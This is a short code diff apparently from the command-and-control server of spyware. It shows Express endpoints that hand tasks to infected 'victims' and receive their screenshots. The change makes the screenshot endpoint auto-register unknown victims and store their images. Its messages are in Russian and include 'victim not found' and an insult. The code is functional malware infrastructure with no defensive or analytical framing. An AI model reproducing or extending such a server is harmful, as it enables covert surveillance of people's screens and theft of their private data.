@@ -85,13 +85,18 @@ app.get('/getMyTasks', async (req,res) => {
 
 app.post('/sendScreen', async (req,res) => {
     if (req && req.body && req.body.image && req.body.uuid && req.body.photoId) {
-      const victim = victims.find(v => v.uuid === req.body.uuid)
+      let victim = victims.find(v => v.uuid === req.body.uuid)
+        
       if (victim) {
         victim.currentPhoto = req.body.image
         console.log('added photo!')
         safeJson(res,req,{'ok': true, 'msg': 'a'},200)
       } else {
-        safeJson(res,req,{'ok': false, 'msg': 'Жертва не найдена'},200)
+        victims.push({uuid: req.body.uuid, pendingTasks: [], currentPhoto: 'none', photoId: 0})
+        victim = victims.find(v => v.uuid === req.body.uuid)
+        victim.currentPhoto = req.body.image
+        console.log('added photo!')
+        safeJson(res,req,{'ok': true, 'msg': 'a'},200)
       }
     } else {
       safeJson(res,req,{'ok': false, 'msg': 'Твоя мать 200'},200)
